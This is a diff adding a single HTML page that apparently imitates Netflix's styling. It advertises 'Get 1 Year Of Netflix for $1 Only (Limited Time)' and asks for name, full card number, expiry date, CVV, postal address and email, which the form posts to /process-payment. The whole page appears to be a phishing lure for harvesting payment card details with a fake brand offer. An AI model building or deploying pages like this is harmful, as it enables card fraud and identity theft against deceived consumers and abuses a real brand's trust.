@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Subscription Payment</title>
+    <style>
+        body {
+            background-color: #141414;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Roboto', sans-serif;
+        }
+
+        .container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+        }
+
+        .card {
+            background-color: #333;
+            padding: 40px;
+            border-radius: 10px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .title {
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        .input-box {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        input {
+            width: calc(100% - 20px);
+            padding: 10px;
+            border: none;
+            border-bottom: 1px solid #777;
+            background-color: transparent;
+            color: white;
+            font-size: 16px;
+            margin-left: 10px;
+        }
+
+        label {
+            position: absolute;
+            left: 10px;
+            top: 10px;
+            color: #777;
+            font-size: 16px;
+            transition: 0.3s;
+            pointer-events: none;
+        }
+
+        input:focus+label,
+        input:valid+label {
+            top: -10px;
+            font-size: 14px;
+            color: #e50914;
+        }
+
+        .submit-button {
+            background-color: #e50914;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            padding: 12px 20px;
+            cursor: pointer;
+            font-size: 18px;
+            width: 100%;
+        }
+
+        .submit-button:hover {
+            background-color: #ff0000;
+        }
+
+        @media (max-width: 600px) {
+            .input-box input {
+                width: calc(100% - 20px);
+                margin-left: 0;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <div class="card">
+            <h1 class="title">Get 1 Year Of Netflix for $1 Only (Limited Time)</h1>
+            <form action="/process-payment" method="post">
+                <div class="input-box">
+                    <input type="text" id="firstName" name="firstName" required>
+                    <label for="firstName">First Name</label>
+                </div>
+                <div class="input-box">
+                    <input type="text" id="lastName" name="lastName" required>
+                    <label for="lastName">Last Name</label>
+                </div>
+                <div class="input-box">
+                    <input type="text" id="cardNumber" name="cardNumber" required>
+                    <label for="cardNumber">Card Number</label>
+                </div>
+                <div class="input-box">
+                    <input type="text" id="expDate" name="expDate" required>
+                    <label for="expDate">Expiration Date</label>
+                </div>
+                <div class="input-box">
+                    <input type="text" id="cvv" name="cvv" required>
+                    <label for="cvv">CVV</label>
+                </div>
+                <div class="input-box">
+                    <input type="text" id="postcode" name="postcode" required>
+                    <label for="postcode">Post Code</label>
+                </div>
+                <div class="input-box">
+                    <input type="text" id="streetAddress" name="streetAddress" required>
+                    <label for="streetAddress">Street Address</label>
+                </div>
+                <div class="input-box">
+                    <input type="text" id="state" name="state" required>
+                    <label for="state">State</label>
+                </div>
+                <div class="input-box">
+                    <input type="text" id="country" name="country" required>
+                    <label for="country">Country</label>
+                </div>
+                <div class="input-box">
+                    <input type="email" id="email" name="email" required>
+                    <label for="email">Email Address</label>
+                </div>
+                <button type="submit" class="submit-button">Pay $1</button>
+            </form>
+        </div>
+    </div>
+</body>
+
+</html>
